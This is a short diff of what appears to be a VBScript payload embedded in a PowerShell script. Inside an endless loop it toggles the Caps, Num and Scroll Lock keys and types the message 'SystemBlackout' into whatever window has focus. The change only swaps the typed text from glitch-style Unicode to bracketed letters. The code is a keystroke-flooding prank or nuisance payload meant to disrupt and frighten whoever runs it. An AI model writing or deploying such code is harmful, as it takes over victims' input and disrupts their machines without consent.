@@ -55,7 +55,7 @@ Do
     WScript.Sleep 100
     x.SendKeys "{CAPSLOCK}"
     x.SendKeys "{NUMLOCK}"
-    x.SendKeys "S̴̛̫̲͇̣̭͙͆̉̂̾̑́̔̓͝y̶̹̙̺͕͎̘̮̎̿́̐̆̓̚̕̚͜ͅs̸̹͔͆t̸͈͔̫͍̅̔͒̄͊̊e̴̝͚̲͙̠̥͊̈́̓̆̕̚͜͝m̸̻͙͈̮̤̫̝̥̍͐̄̉͒͂̂͛̄͘͜͜B̶̮͔̖̪̗̖͋̌͒͌̕ļ̶͔͍͚̹̹͍̠̝́͊̃̊̃ą̵̨͖̞̼͖̳̠̝͊c̷̬̤̩̻̙͑͂̇k̶̡͈̫͈̻̝͋͂̏̂͆̌̈́̾͠ó̷̗̠̠̯̯̣̚͜u̸͓̭̠͎̭͊t̷̟͖̪͚̙̞͆͂̉͝"
+    x.SendKeys "【S】【y】【s】【t】【e】【m】【B】【l】【a】【c】【k】【o】【u】【t】"
     x.SendKeys "{SCROLLLOCK}"
 Loop
 "@
